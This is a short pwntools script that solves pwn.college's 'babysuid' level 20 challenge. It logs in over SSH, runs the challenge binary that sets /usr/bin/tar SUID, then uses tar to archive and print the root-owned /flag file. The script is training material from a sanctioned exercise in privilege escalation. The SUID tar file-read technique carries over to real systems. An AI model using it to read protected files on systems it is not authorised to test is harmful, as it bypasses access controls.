from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level20 to make /usr/bin/tar SUID
s.process("/challenge/babysuid_level20")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/tar /flag
# ? tar -cf /tmp/level20 /flag to create a tar archive of /flag
# ? tar -Oxf /tmp/level20 to extract the tar archive to stdout
sh.sendline(b"tar -cf /tmp/level20 /flag 2>/dev/null; tar -Oxf /tmp/level20")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"FLAG: pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
